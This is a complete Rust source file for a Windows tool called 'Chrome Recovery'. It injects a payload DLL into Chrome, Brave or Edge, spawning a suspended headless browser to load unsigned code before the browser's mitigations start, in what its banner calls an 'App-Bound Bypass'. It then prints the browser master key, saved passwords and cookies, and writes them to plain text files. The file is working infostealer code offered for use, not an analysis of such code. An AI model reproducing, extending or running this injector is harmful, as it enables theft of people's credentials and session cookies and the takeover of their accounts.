//! Chrome Recovery - Injector
//!
//! Finds a running Chromium-based browser process and injects the payload DLL.
//! Supported: Chrome, Chrome Beta, Brave, Edge.
//!
//! Usage:
//!   chrome-recovery.exe                    # auto-detect browser
//!   chrome-recovery.exe chrome             # target Chrome
//!   chrome-recovery.exe edge               # target Edge
//!   chrome-recovery.exe brave              # target Brave

#![windows_subsystem = "console"]

use std::{env, mem, os::windows::ffi::OsStrExt, ffi::OsStr, path::PathBuf, thread, time::Duration};

use windows::{
    Win32::{
        Foundation::CloseHandle,
        System::{
            Diagnostics::{
                Debug::WriteProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
                    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
                },
            },
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE},
            Threading::{
                CreateProcessW, CreateRemoteThread, GetExitCodeThread,
                OpenProcess, QueryFullProcessImageNameW, ResumeThread, TerminateProcess,
                WaitForSingleObject, INFINITE, PROCESS_CREATION_FLAGS,
                PROCESS_INFORMATION, PROCESS_NAME_WIN32,
                PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
                PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
                STARTUPINFOW,
            },
        },
    },
    core::{PCSTR, PCWSTR, PWSTR},
};

// ── Browser process names ─────────────────────────────────────────────────────

struct BrowserTarget {
    name: &'static str,
    exe:  &'static str,
}

static BROWSERS: &[BrowserTarget] = &[
    BrowserTarget { name: "Chrome",      exe: "chrome.exe"  },
    BrowserTarget { name: "Chrome Beta", exe: "chrome.exe"  },  // same exe, different profile
    BrowserTarget { name: "Brave",       exe: "brave.exe"   },
    BrowserTarget { name: "Edge",        exe: "msedge.exe"  },
];

fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

// ── Process finder ────────────────────────────────────────────────────────────

fn find_browser_pids(target_exe: &str) -> Vec<u32> {
    let mut pids = Vec::new();
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name: String = entry.szExeFile.iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();
                if name.eq_ignore_ascii_case(target_exe) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        CloseHandle(snap).ok();
    }
    pids
}

/// Returns the full exe path for a running PID.
fn get_process_exe_path(pid: u32) -> Option<String> {
    unsafe {
        let proc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid).ok()?;
        let mut buf = vec![0u16; 1024];
        let mut size = buf.len() as u32;
        let ok = QueryFullProcessImageNameW(proc, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size);
        CloseHandle(proc).ok();
        ok.ok()?;
        Some(String::from_utf16_lossy(&buf[..size as usize]))
    }
}

/// Spawn a fresh suspended Chrome process, inject the DLL before any mitigation
/// policies are set, then resume. Returns the spawned PID so we can kill it later.
fn spawn_suspended_and_inject(chrome_exe: &str, dll_path: &str) -> Result<u32, String> {
    let tmp_profile = env::temp_dir().join("cr_headless_profile");
    let profile_str = tmp_profile.to_string_lossy();

    // Headless + remote-debugging keeps Chrome alive while our payload runs.
    let cmdline = format!(
        "\"{}\" --headless=new --disable-gpu \
         --remote-debugging-port=0 --no-first-run \
         --no-default-browser-check --user-data-dir=\"{profile_str}\"",
        chrome_exe
    );

    let exe_w  = wide(chrome_exe);
    let mut cmd_w = wide(&cmdline);

    let mut si = STARTUPINFOW { cb: mem::size_of::<STARTUPINFOW>() as u32, ..Default::default() };
    let mut pi = PROCESS_INFORMATION::default();

    unsafe {
        CreateProcessW(
            PCWSTR(exe_w.as_ptr()),
            PWSTR(cmd_w.as_mut_ptr()),
            None, None, false,
            PROCESS_CREATION_FLAGS(0x0000_0004), // CREATE_SUSPENDED
            None, None,
            &si, &mut pi,
        ).map_err(|e| format!("CreateProcessW: {e}"))?;

        let pid = pi.dwProcessId;

        // Inject while primary thread is still suspended → no Chrome mitigations active yet.
        match inject_dll(pid, dll_path) {
            Ok(()) => {
                ResumeThread(pi.hThread);
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Ok(pid)
            }
            Err(e) => {
                TerminateProcess(pi.hProcess, 1).ok();
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Err(e)
            }
        }
    }
}

// ── DLL injector ─────────────────────────────────────────────────────────────

fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
    let dll_wide = wide(dll_path);
    let dll_bytes = dll_wide.len() * 2;

    unsafe {
        let proc = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
            false, pid,
        ).map_err(|e| format!("OpenProcess({pid}): {e}"))?;

        let remote = VirtualAllocEx(proc, None, dll_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote.is_null() {
            CloseHandle(proc).ok();
            return Err("VirtualAllocEx failed".into());
        }

        let mut written = 0usize;
        WriteProcessMemory(proc, remote, dll_wide.as_ptr() as *const _, dll_bytes, Some(&mut written))
            .map_err(|e| {
                let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
                let _ = CloseHandle(proc);
                format!("WriteProcessMemory: {e}")
            })?;

        let k32 = GetModuleHandleW(windows::core::w!("kernel32.dll"))
            .map_err(|e| format!("GetModuleHandleW: {e}"))?;

        let loadlib = GetProcAddress(k32, PCSTR(b"LoadLibraryW\0".as_ptr()))
            .ok_or("GetProcAddress(LoadLibraryW) failed")?;

        let start_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            mem::transmute(loadlib);

        let thr = CreateRemoteThread(proc, None, 0, Some(start_fn), Some(remote), 0, None)
            .map_err(|e| {
                let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
                let _ = CloseHandle(proc);
                format!("CreateRemoteThread: {e}")
            })?;

        WaitForSingleObject(thr, INFINITE);
        let mut exit_code = 0u32;
        GetExitCodeThread(thr, &mut exit_code).ok();
        CloseHandle(thr).ok();
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
        CloseHandle(proc).ok();

        if exit_code == 0 {
            return Err("LoadLibraryW returned NULL — DLL failed to load (ACG/WDAC/missing dep?)".into());
        }
    }
    Ok(())
}

// ── Main ──────────────────────────────────────────────────────────────────────

fn main() {
    let args: Vec<String> = env::args().collect();

    // DLL path: second arg or same dir as exe.
    let dll_path = if args.len() > 2 {
        PathBuf::from(&args[2])
    } else {
        env::current_exe().unwrap().parent().unwrap().join("chrome_payload.dll")
    };

    if !dll_path.exists() {
        eprintln!("[!] Payload DLL not found: {}", dll_path.display());
        eprintln!("    Build it first: cargo build --release -p chrome-payload --target x86_64-pc-windows-gnu");
        std::process::exit(1);
    }

    let dll_abs = dll_path.canonicalize()
        .unwrap_or(dll_path.clone())
        .to_string_lossy()
        .into_owned();

    // Choose target browser.
    let filter = args.get(1).map(|s| s.to_lowercase());

    let target = BROWSERS.iter().find(|b| {
        match &filter {
            None => true, // auto: will pick first found
            Some(f) => b.name.to_lowercase().contains(f.as_str()),
        }
    });

    let target = match target {
        Some(t) => t,
        None => {
            eprintln!("[!] Unknown browser filter '{}'", filter.unwrap_or_default());
            eprintln!("    Available: chrome, beta, brave, edge");
            std::process::exit(1);
        }
    };

    println!("╔══════════════════════════════════════════════════╗");
    println!("║  Chrome Recovery v1.0 — Rust / App-Bound Bypass  ║");
    println!("╚══════════════════════════════════════════════════╝");
    println!();
    println!("[*] Target     : {}", target.name);
    println!("[*] Payload    : {dll_abs}");
    println!();

    // Clean up stale results from both possible paths.
    let result_path  = env::temp_dir().join("chrome_recovery_result.json");
    let result_path2 = std::path::PathBuf::from(r"C:\Users\Public\chrome_recovery_result.json");
    let _ = std::fs::remove_file(&result_path);
    let _ = std::fs::remove_file(&result_path2);

    // Find a running instance to get the real chrome.exe path.
    let existing_pids = find_browser_pids(target.exe);
    if existing_pids.is_empty() {
        eprintln!("[!] {} not running. Start it first.", target.name);
        std::process::exit(1);
    }
    let chrome_exe = existing_pids.iter()
        .find_map(|&pid| get_process_exe_path(pid))
        .unwrap_or_else(|| target.exe.to_string());

    println!("[*] chrome.exe : {chrome_exe}");

    // ── Strategy 1: spawn a fresh suspended Chrome and inject before mitigations ──
    // A newly-created suspended process has not yet called SetProcessMitigationPolicy,
    // so LoadLibraryW accepts unsigned DLLs.
    let mut spawned_pid: Option<u32> = None;

    print!("[*] Spawning suspended Chrome for injection... ");
    let _ = std::io::Write::flush(&mut std::io::stdout());
    match spawn_suspended_and_inject(&chrome_exe, &dll_abs) {
        Ok(pid) => {
            println!("OK (PID {pid})");
            spawned_pid = Some(pid);
        }
        Err(e) => {
            println!("FAIL ({e})");
        }
    }

    // ── Strategy 2: fallback — try all existing Chrome processes ──────────────
    if spawned_pid.is_none() {
        println!("[*] Falling back to existing process scan...");
        let mut candidates: Vec<u32> = existing_pids;
        candidates.sort();
        let mut injected = false;
        for pid in &candidates {
            print!("[*]   PID {pid}... ");
            let _ = std::io::Write::flush(&mut std::io::stdout());
            match inject_dll(*pid, &dll_abs) {
                Ok(()) => { println!("OK"); injected = true; break; }
                Err(e)  => println!("skip ({e})"),
            }
        }
        if !injected {
            eprintln!("[!] All injection attempts failed.");
            eprintln!("    Chrome enforces strict DLL-signature policy on all process types.");
            std::process::exit(1);
        }
    }

    // Wait for payload (4s startup delay + COM retries).
    print!("[*] Waiting for payload");
    for _ in 0..45 {
        print!(".");
        let _ = std::io::Write::flush(&mut std::io::stdout());
        thread::sleep(Duration::from_secs(1));
        if result_path.exists() || result_path2.exists() { break; }
    }
    println!();

    // Kill the headless Chrome we spawned (if any).
    if let Some(pid) = spawned_pid {
        unsafe {
            if let Ok(proc) = OpenProcess(PROCESS_TERMINATE, false, pid) {
                TerminateProcess(proc, 0).ok();
                CloseHandle(proc).ok();
            }
        }
        let _ = std::fs::remove_dir_all(env::temp_dir().join("cr_headless_profile"));
    }

    let found = if result_path.exists() { &result_path } else { &result_path2 };
    if !found.exists() {
        eprintln!("[!] Timeout: no result from payload.");
        eprintln!("    Check C:\\Users\\Public\\cr_debug.log for diagnostics.");
        std::process::exit(1);
    }

    let json_raw = std::fs::read_to_string(found).unwrap_or_default();
    match serde_json::from_str::<serde_json::Value>(&json_raw) {
        Ok(v) => print_results(&v),
        Err(e) => {
            eprintln!("[!] JSON parse error: {e}");
            eprintln!("{json_raw}");
        }
    }
}

fn print_results(v: &serde_json::Value) {
    if let Some(err) = v.get("error").and_then(|e| e.as_str()) {
        eprintln!("[!] Payload error: {err}");
        return;
    }

    if let Some(browser) = v.get("browser").and_then(|b| b.as_str()) {
        println!("[+] Browser: {browser}");
    }
    if let Some(key) = v.get("master_key_hex").and_then(|k| k.as_str()) {
        println!("[+] Master key: {key}");
    }
    println!();

    // Passwords.
    if let Some(passwords) = v.get("passwords").and_then(|p| p.as_array()) {
        println!("[+] {} passwords", passwords.len());

        let mut file = std::fs::File::create("passwords.txt").ok();
        if let Some(ref mut f) = file {
            use std::io::Write;
            let _ = writeln!(f, "# Chrome Recovery - Passwords");
            let _ = writeln!(f, "# url:username:password");
            let _ = writeln!(f);
        }
        for p in passwords {
            let url  = p["url"].as_str().unwrap_or("-");
            let user = p["username"].as_str().unwrap_or("-");
            let pass = p["password"].as_str().unwrap_or("[error]");
            println!("  {url}  |  {user}  |  {pass}");
            if let Some(ref mut f) = file {
                use std::io::Write;
                let _ = writeln!(f, "{url}:{user}:{pass}");
            }
        }
        if file.is_some() { println!("[+] Saved → passwords.txt"); }
        println!();
    }

    // Cookies.
    if let Some(cookies) = v.get("cookies").and_then(|c| c.as_array()) {
        println!("[+] {} cookies", cookies.len());

        let mut file = std::fs::File::create("cookies.txt").ok();
        if let Some(ref mut f) = file {
            use std::io::Write;
            let _ = writeln!(f, "# Chrome Recovery - Cookies");
            let _ = writeln!(f, "# host,name,value");
            let _ = writeln!(f);
            for c in cookies {
                let host = c["host"].as_str().unwrap_or("");
                let name = c["name"].as_str().unwrap_or("");
                let val  = c["value"].as_str().unwrap_or("");
                let _ = writeln!(f, "{host},{name},{val}");
            }
        }
        if file.is_some() { println!("[+] Saved → cookies.txt"); }
    }
}
